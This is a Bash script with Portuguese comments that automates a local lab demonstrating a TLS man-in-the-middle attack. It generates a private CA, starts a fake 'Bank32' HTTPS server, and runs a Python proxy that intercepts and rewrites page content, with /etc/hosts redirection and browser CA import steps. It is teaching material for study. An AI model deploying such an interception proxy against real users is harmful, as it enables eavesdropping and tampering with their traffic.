#!/usr/bin/env bash
# script.sh - automatiza o lab TLS + MITM (Antixerox)
# Executa como: sudo ./script.sh
set -euo pipefail
IFS=$'\n\t'

# --- Cores ---
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
PURPLE='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# --- Config ---
VOLUMES_DIR="$(pwd)/volumes"
COMPOSE_FILE="$(pwd)/docker-compose.yml"

SERVER_SERVICE_NAME="server-10.9.0.43"
PROXY_SERVICE_NAME="mitm-proxy-10.9.0.143"
CLIENT_SERVICE_NAME="client-10.9.0.5"

SERVER_IP="10.9.0.43"
PROXY_IP="10.9.0.143"
CLIENT_IP="10.9.0.5"

HOSTNAME="www.antixerox.com"

# --- Helpers ---
log() { echo -e "${GREEN}[+]${NC} $*"; }
err() { echo -e "${RED}[!]${NC} $*" >&2; }
info() { echo -e "${CYAN}[i]${NC} $*"; }
step() { echo -e "${PURPLE}${BOLD}[*] $*${NC}"; }

if [ "$(id -u)" -ne 0 ]; then
  err "Este script necessita de sudo/root. Relaunch com sudo."
  exit 1
fi

# check deps
for cmd in docker docker-compose openssl; do
  if ! command -v $cmd >/dev/null 2>&1; then
    err "Dependência em falta: $cmd"
    exit 1
  fi
done

# Check if docker-compose.yml exists
if [ ! -f "$COMPOSE_FILE" ]; then
    err "ERRO: $COMPOSE_FILE não encontrado!"
    err "Vai buscar o docker-compose.yml primeiro."
    exit 1
fi

# --- 1) Limpar e recriar volumes/ do zero ---
log "A limpar volumes/ anterior..."
if [ -d "$VOLUMES_DIR" ]; then
    rm -rf "$VOLUMES_DIR"
    log "✓ Pasta volumes/ removida"
fi

mkdir -p "$VOLUMES_DIR"/{ca,server-certs,client-certs}
log "✓ Pasta volumes/ criada do zero"

# --- 2) Garantir ficheiros python em volumes/ ---
log "A escrever scripts Python em $VOLUMES_DIR..."

cat > "$VOLUMES_DIR/server.py" <<'PYEOF'
#!/usr/bin/env python3
import socket, ssl, sys

html = """HTTP/1.1 200 OK\r
Content-Type: text/html\r
Connection: close\r
\r
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank32 - Secure Banking</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 600px;
            width: 100%;
            padding: 50px;
            text-align: center;
            animation: fadeIn 0.5s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .logo {
            font-size: 64px;
            margin-bottom: 10px;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        h1 {
            color: #667eea;
            font-size: 42px;
            margin-bottom: 20px;
            font-weight: 700;
        }
        .tagline {
            color: #666;
            font-size: 18px;
            margin-bottom: 40px;
        }
        .info-box {
            background: linear-gradient(135deg, #f8f9ff 0%, #e8eaff 100%);
            border-left: 4px solid #667eea;
            padding: 20px;
            margin: 20px 0;
            text-align: left;
            border-radius: 8px;
            transition: transform 0.2s;
        }
        .info-box:hover {
            transform: translateX(5px);
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
            font-size: 18px;
        }
        .info-box p {
            color: #555;
            line-height: 1.6;
        }
        .secure-badge {
            display: inline-block;
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: white;
            padding: 12px 24px;
            border-radius: 25px;
            font-weight: 600;
            margin-top: 30px;
            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
        }
        .secure-badge::before {
            content: "🔒 ";
        }
        .footer {
            margin-top: 30px;
            color: #999;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🏦</div>
        <h1>Welcome to Bank32</h1>
        <p class="tagline">Your trusted partner in secure banking</p>
        
        <div class="info-box">
            <h3>🔐 Secure Connection Established</h3>
            <p>You are connected to Bank32's secure server. All your transactions are protected with industry-standard encryption.</p>
        </div>
        
        <div class="info-box">
            <h3>ℹ️ About Bank32</h3>
            <p>Bank32 has been serving customers since 1990, providing reliable and secure banking services with 24/7 support.</p>
        </div>
        
        <div class="secure-badge">SSL/TLS Protected</div>
        
        <div class="footer">
            © 2025 Bank32 Corporation. All rights reserved.
        </div>
    </div>
</body>
</html>
"""

print("[server] Starting Bank32 HTTPS Server...", flush=True)

try:
    SERVER_CERT = './server-certs/server.crt'
    SERVER_PRIVATE = './server-certs/server.key'
    
    print(f"[server] Loading cert from {SERVER_CERT}", flush=True)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(SERVER_CERT, SERVER_PRIVATE)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 443))
    sock.listen(5)
    print("[server] ✓ Bank32 listening on 0.0.0.0:443", flush=True)
    
    while True:
        newsock, fromaddr = sock.accept()
        try:
            ssock = context.wrap_socket(newsock, server_side=True)
            data = ssock.recv(8192)
            first_line = data.split(b'\r\n')[0] if data else b'(no data)'
            print(f"[server] Request from {fromaddr}: {first_line}", flush=True)
            ssock.sendall(html.encode('utf-8'))
            ssock.shutdown(socket.SHUT_RDWR)
            ssock.close()
        except Exception as e:
            print(f"[server] Connection failed: {e}", flush=True)
            continue
except Exception as e:
    print(f"[server] FATAL ERROR: {e}", flush=True)
    sys.exit(1)
PYEOF
chmod +x "$VOLUMES_DIR/server.py"

# proxy.py
cat > "$VOLUMES_DIR/proxy.py" <<'PYEOF'
#!/usr/bin/env python3
import socket, ssl, threading, sys

print("[proxy] Starting MITM Proxy...", flush=True)

def process_request(ssock_for_browser):
    hostname = "www.antixerox.com"
    try:
        context_client = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        cadir = './client-certs'
        context_client.load_verify_locations(capath=cadir)
        context_client.verify_mode = ssl.CERT_REQUIRED
        context_client.check_hostname = True
        
        sock_for_server = socket.create_connection((hostname, 443), timeout=10)
        ssock_for_server = context_client.wrap_socket(sock_for_server, server_hostname=hostname, do_handshake_on_connect=False)
        ssock_for_server.do_handshake()
        
        request = ssock_for_browser.recv(8192)
        if request:
            ssock_for_server.sendall(request)
            
            full_response = b''
            while True:
                chunk = ssock_for_server.recv(8192)
                if not chunk:
                    break
                full_response += chunk
                if b'</html>' in full_response.lower():
                    break
            
            # MITM ATTACK: Replace Bank32 -> antixerox
            modified = full_response.replace(b"Bank32", b"antixerox")
            modified = modified.replace(b"bank32", b"antixerox")
            
            print("[proxy] ✓ Response modified (Bank32 -> antixerox)", flush=True)
            ssock_for_browser.sendall(modified)
    except Exception as e:
        print(f"[proxy] Error: {e}", flush=True)
    finally:
        try:
            ssock_for_browser.shutdown(socket.SHUT_RDWR)
            ssock_for_browser.close()
        except:
            pass
        try:
            ssock_for_server.shutdown(socket.SHUT_RDWR)
            ssock_for_server.close()
        except:
            pass

try:
    SERVER_CERT = './server-certs/server.crt'
    SERVER_PRIVATE = './server-certs/server.key'
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(SERVER_CERT, SERVER_PRIVATE)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 443))
    sock.listen(5)
    print("[proxy] ✓ MITM Proxy listening on 0.0.0.0:443", flush=True)
    
    while True:
        sock_for_browser, fromaddr = sock.accept()
        try:
            ssock_for_browser = context.wrap_socket(sock_for_browser, server_side=True)
            t = threading.Thread(target=process_request, args=(ssock_for_browser,))
            t.daemon = True
            t.start()
        except Exception as e:
            print(f"[proxy] Accept failed: {e}", flush=True)
            continue
except Exception as e:
    print(f"[proxy] FATAL ERROR: {e}", flush=True)
    sys.exit(1)
PYEOF
chmod +x "$VOLUMES_DIR/proxy.py"

# handshake.py
cat > "$VOLUMES_DIR/handshake.py" <<'PYEOF'
#!/usr/bin/env python3
import socket, ssl, sys, pprint
if len(sys.argv) != 2:
    print("Usage: handshake.py <hostname>")
    sys.exit(1)
hostname = sys.argv[1]
port = 443
cadir = './client-certs'
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.load_verify_locations(capath=cadir)
context.verify_mode = ssl.CERT_REQUIRED
context.check_hostname = True
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((hostname, port))
ssock = context.wrap_socket(sock, server_hostname=hostname)
print("=== Cipher used:", ssock.cipher())
print("=== Server hostname:", ssock.server_hostname)
print("=== Server certificate:")
pprint.pprint(ssock.getpeercert())
ssock.shutdown(socket.SHUT_RDWR)
ssock.close()
PYEOF
chmod +x "$VOLUMES_DIR/handshake.py"

log "✓ Scripts Python criados"

# --- 3) Gerar CA e server cert (SEMPRE do zero) ---
CA_CRT="$VOLUMES_DIR/ca/ca.crt"
CA_KEY="$VOLUMES_DIR/ca/ca.key"
SERVER_CRT_SRC="$VOLUMES_DIR/server-certs/server.crt"
SERVER_KEY_SRC="$VOLUMES_DIR/server-certs/server.key"
CSR_TMP="$VOLUMES_DIR/server.csr"

log "A gerar CA nova..."
openssl genrsa -out "$CA_KEY" 2048 2>/dev/null
openssl req -x509 -new -nodes -key "$CA_KEY" -sha256 -days 3650 -out "$CA_CRT" \
    -subj "/C=PT/ST=Lab/L=Lab/O=AntixeroxCA/OU=Lab/CN=Antixerox Root CA" 2>/dev/null
log "✓ CA criada: $CA_CRT"

log "A gerar certificado do servidor para ${HOSTNAME}..."
openssl genrsa -out "$SERVER_KEY_SRC" 2048 2>/dev/null
openssl req -new -key "$SERVER_KEY_SRC" -out "$CSR_TMP" \
    -subj "/C=PT/ST=Lab/L=Lab/O=Antixerox/OU=Lab/CN=${HOSTNAME}" 2>/dev/null
openssl x509 -req -in "$CSR_TMP" -CA "$CA_CRT" -CAkey "$CA_KEY" -CAcreateserial \
    -out "$SERVER_CRT_SRC" -days 365 -sha256 2>/dev/null
rm -f "$CSR_TMP"
log "✓ Server cert criado: $SERVER_CRT_SRC"

chmod 644 "$CA_CRT" "$SERVER_CRT_SRC" 2>/dev/null || true
chmod 600 "$CA_KEY" "$SERVER_KEY_SRC" 2>/dev/null || true

# --- 4) Copiar CA para client-certs ---
log "A preparar CA para client-certs..."
if command -v c_rehash >/dev/null 2>&1; then
    cp -f "$CA_CRT" "$VOLUMES_DIR/client-certs/"
    c_rehash "$VOLUMES_DIR/client-certs/" >/dev/null 2>&1
    log "✓ c_rehash executado"
else
    HASH_NAME="$(openssl x509 -in "$CA_CRT" -noout -subject_hash).0"
    cp -f "$CA_CRT" "$VOLUMES_DIR/client-certs/${HASH_NAME}"
    log "✓ CA copiada para client-certs"
fi

# --- 5) Levantar containers ---
log "A parar containers antigos..."
docker-compose -f "$COMPOSE_FILE" down 2>/dev/null || true

log "A levantar containers via docker-compose..."
docker-compose -f "$COMPOSE_FILE" up -d

log "A aguardar containers iniciarem..."
sleep 5

log "A verificar se containers estão a correr..."
for container in "$SERVER_SERVICE_NAME" "$PROXY_SERVICE_NAME" "$CLIENT_SERVICE_NAME"; do
    if ! docker ps | grep -q "$container"; then
        err "ERRO: Container $container não está a correr!"
        exit 1
    fi
    log "✓ Container $container running"
done

log "A verificar se python3 está disponível..."
for container in "$SERVER_SERVICE_NAME" "$PROXY_SERVICE_NAME"; do
    if ! docker exec "$container" which python3 >/dev/null 2>&1; then
        err "ERRO: python3 não encontrado em $container!"
        exit 1
    fi
    log "✓ python3 disponível em $container"
done

log "A verificar se volumes estão montados..."
for container in "$SERVER_SERVICE_NAME" "$PROXY_SERVICE_NAME"; do
    if ! docker exec "$container" test -f /volumes/server.py; then
        err "ERRO: /volumes não está montado em $container!"
        exit 1
    fi
    log "✓ Volumes montados em $container"
done

# --- 6) Atualizar /etc/hosts DENTRO dos containers ---
log "A atualizar /etc/hosts dentro dos containers..."
for c in "$CLIENT_SERVICE_NAME" "$PROXY_SERVICE_NAME"; do
    docker exec "$c" sh -c "sed -i '/[[:space:]]${HOSTNAME}\$/d' /etc/hosts 2>/dev/null || true"
    docker exec "$c" sh -c "echo '${SERVER_IP} ${HOSTNAME}' >> /etc/hosts"
    log "✓ /etc/hosts atualizado em $c"
done

# --- 7) Iniciar server.py ---
log "A limpar processos Python antigos..."
docker exec "$SERVER_SERVICE_NAME" sh -c "pkill -9 python3 2>/dev/null || true"
sleep 2

log "A iniciar server.py..."
docker exec -d "$SERVER_SERVICE_NAME" sh -c "cd /volumes && exec python3 -u server.py 2>&1 | tee /tmp/server.log"
sleep 3

if docker exec "$SERVER_SERVICE_NAME" pgrep -f server.py >/dev/null 2>&1; then
    log "✓ server.py a executar (PID: $(docker exec "$SERVER_SERVICE_NAME" pgrep -f server.py))"
else
    err "ERRO: server.py não iniciou!"
    docker exec "$SERVER_SERVICE_NAME" cat /tmp/server.log 2>&1
    exit 1
fi

log "A aguardar porta 443..."
ready=0
for i in $(seq 1 30); do
    if docker exec "$SERVER_SERVICE_NAME" netstat -tln 2>/dev/null | grep -q ':443'; then
        ready=1
        log "✓ Server pronto após ${i}s"
        break
    fi
    sleep 1
done

if [ "$ready" -ne 1 ]; then
    err "ERRO: timeout na porta 443"
    exit 1
fi

log "A testar conectividade..."
if timeout 3 bash -c "echo > /dev/tcp/${SERVER_IP}/443" 2>/dev/null; then
    log "✓ Host consegue conectar ao server"
else
    err "✗ Não consegue conectar ao server"
fi

# --- 8) Update /etc/hosts DO HOST ---
HOST_HOSTS="/etc/hosts"
BACKUP_HOSTS="/etc/hosts.lab-backup.$(date +%s)"
cp -f "$HOST_HOSTS" "$BACKUP_HOSTS"
log "Backup de /etc/hosts: $BACKUP_HOSTS"

sed -i "/[[:space:]]${HOSTNAME//./\\.}\$/d" "$HOST_HOSTS" || true
echo "${SERVER_IP} ${HOSTNAME}" >> "$HOST_HOSTS"
log "✓ /etc/hosts atualizado: ${HOSTNAME} -> ${SERVER_IP}"

echo ""
echo -e "${YELLOW}${BOLD}=========================================================================="
echo "PASSO 1: IMPORTAR CERTIFICADO CA NO BROWSER"
echo -e "==========================================================================${NC}"
echo ""
echo -e "${CYAN}Ficheiro CA:${NC} $CA_CRT"
echo ""
echo -e "${BOLD}Firefox:${NC}"
echo "  1. about:preferences#privacy"
echo "  2. Certificates > View Certificates"
echo "  3. Authorities > Import"
echo "  4. Seleciona: $CA_CRT"
echo "  5. ✓ Trust this CA to identify websites"
echo ""
echo -e "${BOLD}Chrome:${NC}"
echo "  1. chrome://settings/certificates"
echo "  2. Authorities > Import"
echo "  3. Seleciona: $CA_CRT"
echo ""
echo -e "${YELLOW}${BOLD}=========================================================================="
echo "PASSO 2: TESTAR SITE ORIGINAL"
echo -e "==========================================================================${NC}"
echo ""
echo -e "${GREEN}Abre: https://${HOSTNAME}${NC}"
echo -e "Deves ver: ${BOLD}'Welcome to Bank32'${NC} (sem avisos de segurança)"
echo ""
read -p "Quando vires o site ORIGINAL a funcionar, press ENTER para MITM..."

# --- 9) Iniciar proxy ---
log "A limpar processos antigos no proxy..."
docker exec "$PROXY_SERVICE_NAME" sh -c "pkill -9 python3 2>/dev/null || true"
sleep 2

log "A iniciar proxy.py..."
docker exec -d "$PROXY_SERVICE_NAME" sh -c "cd /volumes && exec python3 -u proxy.py 2>&1 | tee /tmp/proxy.log"
sleep 3

if docker exec "$PROXY_SERVICE_NAME" pgrep -f proxy.py >/dev/null 2>&1; then
    log "✓ proxy.py a executar"
else
    err "AVISO: proxy.py pode não estar a executar"
fi

log "A aguardar proxy na porta 443..."
ready=0
for i in $(seq 1 30); do
    if docker exec "$PROXY_SERVICE_NAME" netstat -tln 2>/dev/null | grep -q ':443'; then
        ready=1
        log "✓ Proxy pronto após ${i}s"
        break
    fi
    sleep 1
done

sed -i "/[[:space:]]${HOSTNAME//./\\.}\$/d" "$HOST_HOSTS" || true
echo "${PROXY_IP} ${HOSTNAME}" >> "$HOST_HOSTS"
log "✓ /etc/hosts: ${HOSTNAME} -> ${PROXY_IP} (MITM ATIVO)"

echo ""
echo -e "${RED}${BOLD}=========================================================================="
echo "⚠️  MITM ATIVO! ⚠️"
echo -e "==========================================================================${NC}"
echo ""
echo -e "${YELLOW}Recarrega o browser (CTRL+SHIFT+R)${NC}"
echo -e "Deves ver: ${BOLD}'Welcome to antixerox'${NC} (Bank32 substituído!)"
echo ""
read -p "Quando tiveres visto a versão MITM, press ENTER para limpar..."

# --- 10) Cleanup ---
log "A repor /etc/hosts..."
mv -f "$BACKUP_HOSTS" "$HOST_HOSTS" || true
log "✓ /etc/hosts reposto"

echo ""
echo -e "${GREEN}${BOLD}=========================================================================="
echo "✓ Lab concluído!"
echo -e "==========================================================================${NC}"
info "CA: $CA_CRT"
info "Parar containers: docker-compose -f \"$COMPOSE_FILE\" down"
info "Ver logs server: docker logs $SERVER_SERVICE_NAME"
info "Ver logs proxy: docker logs $PROXY_SERVICE_NAME"
echo -e "${GREEN}${BOLD}==========================================================================${NC}"

exit 0
